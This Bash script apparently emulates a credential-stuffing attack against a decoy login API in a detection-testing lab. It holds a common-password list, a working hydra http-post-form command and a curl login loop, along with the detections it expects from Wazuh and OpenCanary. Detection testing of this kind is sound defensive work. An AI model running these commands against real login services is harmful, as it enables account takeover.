#!/bin/bash
# ============================================================================
# Escenario S05: Credential Stuffing (T1110.004)
# ============================================================================
# Herramientas: hydra con wordlist real
# Target: API de autenticación (10.20.0.20:8000/api/v1/auth/login)
# ============================================================================

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR/evidencia"
mkdir -p "$EVIDENCE_DIR"

DECOY_API="http://10.20.0.20:8000"
LOGIN_URL="$DECOY_API/api/v1/auth/login"
TIMESTAMP=$(date -u +"%Y%m%dT%H%M%SZ")

echo "=========================================="
echo "S05: Credential Stuffing (T1110.004)"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="

echo "$TIMESTAMP" > "$EVIDENCE_DIR/start_time.txt"

# Crear mini-diccionario de credenciales robadas (simulado)
if [ ! -f /tmp/creds.txt ]; then
    cat > /tmp/creds.txt <<'EOF'
admin:admin
admin:password123
user:123456
admin:qwerty
test:test
contribuyente:contribuyente123
admin:admin123
root:root
admin:12345
admin:welcome
admin:letmein
admin:monkey
admin:dragon
admin:master
admin:abc123
EOF
fi

# 1. Hydra HTTP-POST form attack contra el login
echo "[*] Fase 1: Hydra credential stuffing contra API"
cut -d: -f1 /tmp/creds.txt | sort -u > /tmp/hydra_users.txt
cut -d: -f2 /tmp/creds.txt | sort -u > /tmp/hydra_passwords.txt
hydra -L /tmp/hydra_users.txt \
    -P /tmp/hydra_passwords.txt \
    -t 8 -f -s 8000 \
    "10.20.0.20" \
    http-post-form \
    "/api/v1/auth/login:username=^USER^&password=^PASS^:F=401" \
    -o "$EVIDENCE_DIR/hydra_creds_results.txt" 2>/dev/null || true

# 2. Variación con curl directo
echo "[*] Fase 2: Múltiples requests de login (simulación credential stuffing)"
for i in {1..20}; do
    USER="user_$i"
    PASS="pass_$i"
    curl -s -X POST "$LOGIN_URL" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" \
        -o "$EVIDENCE_DIR/login_attempt_$i.json"
    sleep 0.2
done

END_TIME=$(date -u +"%Y%m%dT%H%M%SZ")
echo "$END_TIME" > "$EVIDENCE_DIR/end_time.txt"

cat > "$EVIDENCE_DIR/resultados.json" <<EOF
{
  "scenario": "S05-credential-stuffing",
  "technique_id": "T1110.004",
  "technique_name": "Credential Stuffing",
  "tactic": "Credential Access",
  "timestamp_start": "$TIMESTAMP",
  "timestamp_end": "$END_TIME",
  "tools_used": ["hydra", "curl"],
  "target": "$LOGIN_URL",
  "credentials_tested": $(wc -l < /tmp/creds.txt),
  "evidence_files": ["hydra_creds_results.txt", "login_attempt_*.json"],
  "expected_detection": [
    "Decoy API: T1110.004 in attack_logger",
    "Wazuh: 401 burst detection",
    "OpenCanary HTTP honeypot"
  ],
  "iso27035_phase": "Detection and Reporting (Phase 2)"
}
EOF

echo "[OK] Escenario S05 ejecutado."
